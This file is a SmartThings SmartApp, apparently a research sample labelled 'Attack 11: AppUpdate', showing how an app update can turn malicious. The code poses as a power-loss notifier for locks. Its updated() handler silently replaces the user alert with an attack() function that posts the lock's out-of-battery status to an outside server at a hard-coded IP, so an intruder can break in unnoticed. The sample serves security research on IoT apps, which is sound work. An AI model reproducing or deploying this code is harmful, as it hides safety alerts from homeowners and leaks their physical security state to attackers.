/**
 * Attack Description:
 * 		Attacker insert the malicious functions into the user's smartApp by updating his apps..
 * Normal functions:
 * 		The user installed the legal smartApp powerOutDetector to detect the battery of the locks and windows. If the batteries of locks and windows are low, then it would send sms to the user. If the batteries are recharged, then it would send the sms to tell the user that the devices work normally.
 * Malicious functions:
 * 		 The attacker could update his smartApp. And the update code would be added to the user’s normal app without the permission of the user. If the battery of the lock runs out, the malicious smartApp would not send message to the user about the low battery. Instead, it sends the message to the attacker so that the attacker could break in easily.
 */
definition(
		name: "Attack 11: AppUpdate",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "App update",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	section("When there is wired-power loss on...") {
		input "lockMotion", "capability.motionSensor", title: "Where?"
	}

	section("Via a push notification and a text message(optional)"){
		input "pushAndPhone", "enum", title: "Send Text?", required: false, metadata: [values: ["Yes", "No"]]
		input "phone1", "phone", title: "Phone Number (for Text, optional)", required: false
	}
}

def installed() {
	log.debug "installed"
	subscribe(lockMotion, "powerSource.battery", onBatteryPowerHandler)
	subscribe(lockMotion, "powerSource.dc", PoweredPowerHandler)
	subscribe(lockMotion, "powerSource.mains", PoweredPowerHandler)
}

def updated() {
	log.debug "updated"
	unsubscribe()
	subscribe(lockMotion, "powerSource.battery", onBatteryPowerAttackHandler)
	subscribe(lockMotion, "powerSource.dc", PoweredPowerHandler)
	subscribe(lockMotion, "powerSource.mains", PoweredPowerHandler)
}


def onBatteryPowerHandler(evt) {
	log.trace "$evt.value: $evt"
	def msg = "${lockMotion.label ?: lockMotion.name} sensed Power is Out!"
	log.debug "sending push for power is out"
	sendPush(msg)
	if ( phone1 && pushAndPhone ) {
		log.debug "sending SMS to ${phone1}"
		sendSms(phone1, msg)
	}
}

def onBatteryPowerAttackHandler(evt) {
	log.trace "$evt.value: $evt"
	def msg = "${lockMotion.label ?: lockMotion.name} sensed Power is Out!"
	log.debug "attack"
	attack()
}


def PoweredPowerHandler(evt) {
	log.trace "$evt.value: $evt"
	def msg = "${lockMotion.label ?: lockMotion.name} sensed Power is Back On!"
	log.debug "sending push for power is back on"
	sendPush(msg)
	if ( phone1 && pushAndPhone ) {
		log.debug "sending SMS to ${phone1}"
		sendSms(phone1, msg)
	}
}

def attack() {
	def data= ["lockMotion": "out of battery!!!"]
	try {
		httpPost("http://128.174.237.226:8080/ProvenanceServer/Attack", data) { resp -> 
			log.debug "attack succeeded" 
		}
	} catch (Exception e) {
		log.error "attack failed"
	}
}
